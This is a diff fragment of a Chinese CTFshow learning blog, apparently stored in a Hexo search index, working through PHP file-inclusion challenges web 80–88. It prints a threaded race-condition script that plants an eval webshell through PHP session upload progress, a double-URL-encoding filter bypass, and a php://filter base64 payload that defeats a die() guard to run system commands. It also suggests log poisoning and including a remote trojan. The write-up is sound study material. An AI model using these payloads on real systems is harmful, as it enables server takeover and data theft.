+<p>Apache:&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</p>
+<p>或许还可以试试有没有error.log</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240313111318671.png"  alt="image-20240313111318671"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240313111708459.png"  alt="image-20240313111708459"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240313111721356.png"  alt="image-20240313111721356"></p>
+<p>得吃</p>
+<p>当然你也可以让file包含你服务器的木马文件，然后直接上线它的服务器也可以</p>
+<h1 id="web-81"><a href="#web-81" class="headerlink" title="web 81"></a>web 81</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240313111952192.png"  alt="image-20240313111952192"></p>
+<p>多过滤了一个:</p>
+<p>和上题一样，不能请求自己服务器的木马而已</p>
+<h1 id="web-82-86"><a href="#web-82-86" class="headerlink" title="web 82-86"></a>web 82-86</h1><p><a href="https://blog.csdn.net/qq_46918279/article/details/120106832">CTFSHOW-文件包含_highlight_file(<strong>file</strong>);-CSDN博客</a></p>
+<p>进行一个新知识的学</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line">url=<span class="string">&#x27;http://08d4a04e-19b3-4049-8a81-e9c6226eee2f.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"><span class="comment">#设置PHPSESSID的值</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span>     </span><br><span class="line">data=&#123;<span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/tao.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span>&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#为了进行条件竞争，需要一边写一边读</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#进行上传文件时需要post传递名为PHP_SESSION_UPLOAD_PROGRESS值为一句话木马</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">	fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)          <span class="comment">#生产一个50k的文件</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url,</span><br><span class="line">			data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">			cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid&#125;,</span><br><span class="line">			files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)&#125;    <span class="comment">#设置文件名字和内容</span></span><br><span class="line">			)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#读取session文件，这里文件为/tmp/sess_ctfshow</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data)</span><br><span class="line">		response2=session.get(url+<span class="string">&#x27;tao.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span> response2.status_code==<span class="number">200</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;++++++++++++++++++++&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(response2.status_code)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line">	<span class="comment">#开启多线程进行竞争	</span></span><br><span class="line">	evnet=threading.Event()</span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:			</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">			threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">			threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">	evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="web-87"><a href="#web-87" class="headerlink" title="web 87"></a>web 87</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240316125758740.png"  alt="image-20240316125758740"></p>
+<p>这题目的是写入木马，并成功执行木马</p>
+<p>分析一波:</p>
+<p>这里的文件名中不能有php，data，：，.</p>
+<p>并且木马写上去后还会先执行死亡程序，不会执行木马</p>
+<p>该怎么做</p>
+<p>先要了解一下<code>php://filter/write=convert.base64-decode/resouce=flag.php</code></p>
+<p>这里是打开一个中间流，如果我们在文件名那里写上这个的话，那么<code>file_put_contents()</code>会这样做，把第二个参数的值以base64解码，并且写到flag.php文件中，接下来就介绍如何突破限制</p>
+<h2 id="文件名"><a href="#文件名" class="headerlink" title="文件名"></a>文件名</h2><p>既然我们要写上上面的payload，那么该如何绕过，可以看到下面还有一层url解码，所以这里可以双重url编码绕过，自己用python写了个脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">payload = <span class="built_in">input</span>(<span class="string">&quot;your payload:[+]&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">twencode</span>(<span class="params">payload</span>):</span><br><span class="line">    res=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    chars = <span class="built_in">list</span>(payload)</span><br><span class="line">    length = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        asc = <span class="built_in">ord</span>(char)</span><br><span class="line">        x0 = <span class="built_in">hex</span>(asc)</span><br><span class="line">        t = x0.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        res += <span class="string">&#x27;%25&#x27;</span>+t</span><br><span class="line">        <span class="comment">#print(res)</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>+twencode(payload))</span><br><span class="line"><span class="comment">#check it</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[-]&quot;</span>+(urllib.parse.unquote((urllib.parse.unquote(twencode(payload))))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240316222716829.png"  alt="image-20240316222716829"></p>
+<h2 id="绕过死亡"><a href="#绕过死亡" class="headerlink" title="绕过死亡"></a>绕过死亡</h2><p>前面提到会以base64解码的形式写入，介绍一下base64解码的过程</p>
+<p>1.筛选字符，把不属于65个base64字符去掉</p>
+<p>2.解码，每四个base64字符为一组解码</p>
+<p>我们这样来操作一下<?php die('大佬别秀了');?></p>
+<p>第一步剩下phpdie</p>
+<p>第二步，由于只有6个字符，解码失败，所以我们要手动添加两个字符，给它乱解即可，反正最后执行我们的php代码即可</p>
+<p>所以payload:<code>content=aaPD9waHAgc3lzdGVtKCdscycpOzs/Pg==</code>aa是自己加的，后面的是<?php system('ls');?></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240316180606776.png"  alt="image-20240316180606776"></p>
+<p>最后再切换命令查看flag即可</p>
+<h1 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240316194352222.png"  alt="image-20240316194352222"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240316194408379.png"  alt="image-20240316194408379"></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+        <tag>ctfshow</tag>
       </tags>
   </entry>
 </search>
